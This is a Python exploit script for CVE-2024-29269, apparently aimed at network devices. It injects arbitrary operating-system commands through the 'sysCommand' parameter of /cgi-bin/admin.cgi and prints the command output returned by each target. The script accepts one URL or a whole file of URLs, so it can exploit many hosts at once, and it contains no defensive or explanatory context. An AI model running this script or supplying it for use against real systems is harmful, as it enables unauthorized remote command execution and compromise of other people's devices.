#!/bin/env python3

import requests
import re
import threading
from colorama import Fore, Style
import argparse


def banniere():

   

    print('\n'+Fore.YELLOW + Style.BRIGHT +f'CVE-2024-29269\nRewritten:Jhonson' + Style.RESET_ALL+'\n') 

banniere()

def main(list, command):
 try:
  if not args.url : 
    with open(list, "r") as f:
      for line in f:
         list_strip=line.strip()
     
         url=f'{list_strip}/cgi-bin/admin.cgi?Command=sysCommand&Cmd={command}'
         r=requests.get(url)
         if r.status_code==200:
           regex  = r'<CmdResult><!\[CDATA\[(.*?)\]\]></CmdResult>'
           matche = re.search(regex, r.text,re.DOTALL)
           print(Fore.WHITE + Style.BRIGHT +list_strip.strip()+'Url Vulnerable -->'+matche.group(1).strip()+Style.RESET_ALL)
          
         else:
           print(Fore.red + Style.BRIGHT +list_strip.strip()+' Url No Vulnerable --> '+matche.group(1).strip())
 
 except requests.exceptions.MissingSchema:
            print('')
 except AttributeError:
            print('')  

def simple_target(url,command,dir):
   try:
       r=requests.get(str(url)+f'{dir}{command}', verify=False,timeout=20)
       if r.status_code==200:
           regex  = r'<CmdResult><!\[CDATA\[(.*?)\]\]></CmdResult>'
           matche = re.search(regex, r.text,re.DOTALL)
           print(Fore.GREEN + Style.BRIGHT +url+' Url Vulnerable --> '+matche.group(1)+Style.RESET_ALL)


       else:
           print(Fore.red + Style.BRIGHT +url+' Url No Vulnerable --> '+matche.group(1))


   except requests.exceptions.MissingSchema:
          print('')
     


if __name__=='__main__':
     

      
       parser = argparse.ArgumentParser(description="CVE-2024-29269")
       parser.add_argument("-list", "--list", dest="list", help="list urls", required=False)
       parser.add_argument("-url", "--url", dest="url", help="url", required=False)
       parser.add_argument("-command", "--command", dest="command", help="command injection", required=False)          
       args = parser.parse_args()

       
       
       thread = threading.Thread(target=main, args=(args.list, args.command))
       thread.start()
       thread.join(timeout=2)
       simple_target(args.url,args.command,f'/cgi-bin/admin.cgi?Command=sysCommand&Cmd=')
